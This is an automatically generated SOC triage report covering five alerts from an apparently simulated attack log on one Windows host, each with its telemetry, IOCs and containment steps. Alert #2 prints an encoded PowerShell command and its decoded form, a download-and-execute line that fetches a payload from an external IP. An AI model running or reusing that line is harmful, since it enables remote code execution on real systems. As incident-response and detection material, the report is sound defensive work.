# SOC Tier-1 Automated Triage & Incident Report

- **Generated At:** `2026-11-25 14:54:39 UTC`
- **Log Source:** `samples/attack_simulation.xml`
- **Evidence SHA-256:** `13241fa705eebe8bce84aef7e9cbca226cae11950e7862550c2477e5704349a1`
- **Total Events Scanned:** `6`
- **Unique Alerts Triggered:** `5` (Raw hits: `5`)

## Severity Summary
| Critical | High | Medium | Low |
| :---: | :---: | :---: | :---: |
| 2 | 2 | 1 | 0 |

---

## Alert #1: [MEDIUM] Failed Remote or Network Logon Attempt (Brute Force Indicator)
- **Rule ID:** `5a2d8c91-1f4e-4b7a-9c3d-6e8f0a1b2c3d`
- **MITRE ATT&CK:** `T1110`
- **Affected Host:** `CORP-FINANCE-04.local`
- **Event Timestamp:** `2026-11-25T13:58:10.112Z`
- **Event ID:** `4625` | **Occurrences:** `1`
- **Description:** Detects failed remote RDP (Type 10) or Network (Type 3) logon attempts indicative of password spraying or brute-force attacks.

### Event Telemetry
```json
{
  "EventID": 4625,
  "TimeCreated": "2026-11-25T13:58:10.112Z",
  "Computer": "CORP-FINANCE-04.local",
  "Provider": "Microsoft-Windows-Security-Auditing",
  "TargetUserName": "ajay.k",
  "LogonType": "10",
  "IpAddress": "91.240.118.172",
  "Status": "0xc000006d"
}
```

### Extracted Indicators of Compromise (IOCs)

| IP Address | Verdict | Confidence | ISP | Country | Source |
| :--- | :--- | :---: | :--- | :---: | :--- |
| `91.240.118.172` | Clean | 0% | Chang Way Technologies Co. Limited | RU | AbuseIPDB API |

### Recommended Containment & Next Steps
- [ ] Block the offending source IP (`IpAddress`) at the perimeter firewall or VPN gateway.
- [ ] Verify if any failed attempts were followed by a successful logon (`EventID 4624`) from the same IP.
- [ ] Ensure Account Lockout Policies and Multi-Factor Authentication (MFA) are enforced on RDP/VPN endpoints.

---

## Alert #2: [HIGH] Suspicious Encoded PowerShell Execution
- **Rule ID:** `8f9c2a10-4b3e-4d1a-9f8c-1a2b3c4d5e6f`
- **MITRE ATT&CK:** `T1059.001`
- **Affected Host:** `CORP-FINANCE-04.local`
- **Event Timestamp:** `2026-11-25T14:02:11.412Z`
- **Event ID:** `4688` | **Occurrences:** `1`
- **Description:** Detects PowerShell execution using encoded command flags while filtering out known administrative service accounts.

### Event Telemetry
```json
{
  "EventID": 4688,
  "TimeCreated": "2026-11-25T14:02:11.412Z",
  "Computer": "CORP-FINANCE-04.local",
  "Provider": "Microsoft-Windows-Security-Auditing",
  "SubjectUserName": "ajay.k",
  "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
  "CommandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
}
```

### Automated Payload De-obfuscation (UTF-16LE Base64)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.42/payload.ps1')
```

### Extracted Indicators of Compromise (IOCs)
- **URL:** `http://185.220.101.42/payload.ps1`

| IP Address | Verdict | Confidence | ISP | Country | Source |
| :--- | :--- | :---: | :--- | :---: | :--- |
| `185.220.101.42` | Malicious | 100% | Network for Tor-Exit traffic. | DE | AbuseIPDB API |

### Recommended Containment & Next Steps
- [ ] Isolate the affected host from the network if unauthorized C2 traffic is confirmed.
- [ ] Block extracted external C2 IPs and payload URLs at the perimeter firewall and web proxy.
- [ ] Inspect parent process (e.g., WINWORD.EXE) and quarantine any originating phishing email or attachment.
- [ ] Enforce PowerShell Constrained Language Mode and Script Block Logging (Event ID 4104).

---

## Alert #3: [HIGH] Suspicious Scheduled Task Creation in User-Writable Path
- **Rule ID:** `7b4e1a82-9c3d-4e5f-8a1b-2c3d4e5f6a7b`
- **MITRE ATT&CK:** `T1053.005`
- **Affected Host:** `CORP-FINANCE-04.local`
- **Event Timestamp:** `2026-11-25T14:03:02.500Z`
- **Event ID:** `4698` | **Occurrences:** `1`
- **Description:** Detects creation of a Windows Scheduled Task pointing to binaries or scripts inside Temp, AppData, or Public folders.

### Event Telemetry
```json
{
  "EventID": 4698,
  "TimeCreated": "2026-11-25T14:03:02.500Z",
  "Computer": "CORP-FINANCE-04.local",
  "Provider": "Microsoft-Windows-Security-Auditing",
  "SubjectUserName": "ajay.k",
  "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\SysHealthSync",
  "TaskContent": "<Exec><Command>C:\\Users\\ajay.k\\AppData\\Local\\Temp\\updater.exe</Command></Exec>"
}
```

### Recommended Containment & Next Steps
- [ ] Disable and delete the malicious scheduled task (`schtasks /delete /tn <TaskName> /f`).
- [ ] Collect and hash (SHA-256) the referenced binary/script in AppData or Temp for malware analysis.
- [ ] Audit the creating user account (`SubjectUserName`) for signs of credential compromise.

---

## Alert #4: [CRITICAL] Potential LSASS Memory Credential Dumping
- **Rule ID:** `3c7e9b21-8a4f-41d2-b6e0-9f1d2c3b4a5e`
- **MITRE ATT&CK:** `T1003.001`
- **Affected Host:** `CORP-FINANCE-04.local`
- **Event Timestamp:** `2026-11-25T14:03:45.889Z`
- **Event ID:** `10` | **Occurrences:** `1`
- **Description:** Detects processes opening a handle to lsass.exe with suspicious memory read access masks (Sysmon Event ID 10).

### Event Telemetry
```json
{
  "EventID": 10,
  "TimeCreated": "2026-11-25T14:03:45.889Z",
  "Computer": "CORP-FINANCE-04.local",
  "Provider": "Microsoft-Windows-Sysmon",
  "SourceImage": "C:\\Users\\ajay.k\\AppData\\Local\\Temp\\mimi.exe",
  "TargetImage": "C:\\Windows\\System32\\lsass.exe",
  "GrantedAccess": "0x1010"
}
```

### Recommended Containment & Next Steps
- [ ] Immediately isolate the endpoint to prevent lateral movement with harvested credentials.
- [ ] Force a password reset and Kerberos TGT reset for all users logged into the compromised host.
- [ ] Terminate and quarantine the offending source binary (`SourceImage`) and collect memory/disk artifacts.
- [ ] Verify Credential Guard / LSA Protection (`RunAsPPL`) is enabled on Windows endpoints.

---

## Alert #5: [CRITICAL] Windows Security Audit Log Cleared
- **Rule ID:** `9d6f3b14-2e5a-4c8d-b1f0-3a4b5c6d7e8f`
- **MITRE ATT&CK:** `T1070.001`
- **Affected Host:** `CORP-FINANCE-04.local`
- **Event Timestamp:** `2026-11-25T14:06:19.004Z`
- **Event ID:** `1102` | **Occurrences:** `1`
- **Description:** Detects clearing of the Windows Security Event Log, commonly performed by attackers to cover tracks post-compromise.

### Event Telemetry
```json
{
  "EventID": 1102,
  "TimeCreated": "2026-11-25T14:06:19.004Z",
  "Computer": "CORP-FINANCE-04.local",
  "Provider": "Microsoft-Windows-Eventlog",
  "SubjectUserName": "ajay.k"
}
```

### Recommended Containment & Next Steps
- [ ] Treat immediately as high-priority post-exploitation defense evasion.
- [ ] Check centralized SIEM/syslog forwarding or Volume Shadow Copies to recover purged event history.
- [ ] Investigate recent privilege escalation (`EventID 4672`) or new service creations preceding the log wipe.

---
